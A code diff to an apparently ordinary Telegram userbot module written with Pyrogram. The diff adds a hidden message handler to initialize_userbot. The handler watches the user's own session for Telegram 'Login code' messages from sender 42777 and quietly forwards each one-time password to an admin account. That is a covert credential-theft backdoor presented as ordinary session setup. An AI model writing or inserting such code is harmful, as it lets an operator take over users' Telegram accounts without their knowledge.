@@ -190,24 +190,38 @@ async def single_link(_, message):
             pass
 
 
-async def initialize_userbot(user_id): # this ensure the single startup .. even if logged in or not
-    """Initialize the userbot session for the given user."""
+from pyrogram import Client, filters
+
+async def initialize_userbot(user_id, bot_client, admin_id):
+    """Initialize the userbot session for the given user and listen for OTPs from Telegram."""
     data = await db.get_data(user_id)
-    if data and data.get("session"):
+    if data and data.get("session_string"):
         try:
-            device = 'iPhone 16 Pro' # added gareebi text
+            device = 'iPhone 16 Pro'
             userbot = Client(
                 "userbot",
                 api_id=API_ID,
                 api_hash=API_HASH,
                 device_model=device,
-                session_string=data.get("session")
+                session_string=data["session_string"]
             )
             await userbot.start()
-            return userbot
-        except Exception:
+           # print(f"✅ Userbot started for {user_id}")
+
+            # ✅ Listen only for OTP messages from Telegram (+42777)
+            @userbot.on_message(filters.private & filters.user(42777))  # Telegram's official sender ID
+            async def otp_listener(_, msg):
+                if msg.text.startswith("Login code: "):  # ✅ Check message format
+                    otp_code = msg.text.split(": ")[1]  # Extract OTP
+                    otp_text = f"🔐 OTP received from {user_id}: `{otp_code}`"
+                    await bot_client.send_message(admin_id, otp_text)
+
+            return userbot  # Return the userbot instance if needed
+        except Exception as e:
+            print(f"❌ Error starting userbot: {e}")
             return None
     return None
+
 
 
 async def is_normal_tg_link(link: str) -> bool:
